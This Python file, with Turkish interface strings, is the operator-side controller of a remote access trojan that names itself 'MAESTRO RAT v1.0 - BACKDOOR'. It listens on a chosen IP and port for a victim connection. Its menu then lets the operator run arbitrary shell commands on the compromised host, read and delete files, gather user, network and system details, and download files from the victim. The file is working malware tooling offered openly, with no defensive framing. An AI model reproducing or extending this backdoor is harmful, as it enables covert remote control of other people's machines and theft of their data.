import socket
import argparse
from colorama import Fore, Style
import os


def print_command_list():
    commands = {
        "exit": "Sunucu bağlantısını sonlandırır.",
        "execute": "Belirli bir terminal komutunu sunucuda çalıştırır.",
        "cat [dosya_adı]": "Belirtilen dosyanın içeriğini sunucudan istemciye gönderir.",
        "rm [dosya_adı]": "Belirtilen dosyayı veya dizini siler.",
        "ls": "Sunucudaki mevcut dizinin içeriğini listeler.",
        "cd [hedef_klasör]": "Sunucudaki çalışma dizinini değiştirir.",
        "mkdir [klasör_adı]": "Yeni bir klasör oluşturur.",
        "touch [dosya_adı]": "Yeni bir dosya oluşturur.",
    "echo [metin] >> [dosya_adı]": "Belirtilen dosyanın sonuna metin ekler.",
        "whoami": "Sunucuda oturum açmış kullanıcıyı döndürür.",
        "ifconfig": "Sunucunun ağ bilgilerini döndürür.",
        "cpu": "Sunucunun CPU bilgilerini döndürür.",
        "memory": "Sunucunun bellek kullanım bilgilerini döndürür.",
        "osinfo": "Sunucunun işletim sistemi bilgilerini döndürür.",
        "download ": "Sunucudan belirtilen dosyayı indirir."
    }

    print("Backdoor Komut Listesi:")
    for command, description in commands.items():
        print(f"{command.ljust(25)}: {description}")
        
def main():
    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - BACKDOOR')
    parser.add_argument('-lhost', dest='ip', help='YOUR IP ADRESS', required=True)
    parser.add_argument('-lport', dest='port', help='YOUR PORT', required=True)
    args = parser.parse_args()

    ip = args.ip
    port = int(args.port)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))  
        s.listen(1)  
        print(f"{Fore.RED}{ip}:{port} dinleniyor...")

        conn, addr = s.accept()  
        print(f"{Fore.GREEN}{Style.RESET_ALL}Bağlantı alındı: {addr}")

        
        print_command_list()

        while True:
            komut = input("Komutu giriniz ('exit' yazarak çıkabilirsiniz): ") 
            conn.send(komut.encode()) 

            if komut == 'exit':
                soru = input("Gerçekten Bağlantıyı sonlandırılsın mı? (y/n) : ")
                if soru == 'y':
                    break
                if soru == 'n':
                    pass                    

            elif komut.strip() == 'execute':  
                print("Lütfen 'execute' komutu için bir komut girin:")
                islem = input()
                conn.send(islem.encode())
                
            elif komut.strip() == 'download':
                islem = input("İndirilecek Dosya İsmini Giriniz : ")
                conn.send(islem.encode())                
                
                
                file_data = conn.recv(8192)
                if file_data.startswith('Dosya bulunamadı'.encode()):
                    print(file_data.decode())
                else:
                    with open(islem, 'wb') as file:
                        file.write(file_data)
                    print(f"{islem} dosyası başarılı bir şekilde bulunduğunuz dizine indirildi.{Fore.GREEN}[√]{Style.RESET_ALL}")
                    
                         
             
                 
                                
                
                
            else:
                received_data = conn.recv(8192)  
                print(received_data.decode(errors='ignore')) 

        conn.close() 

if __name__ == "__main__":
    main()
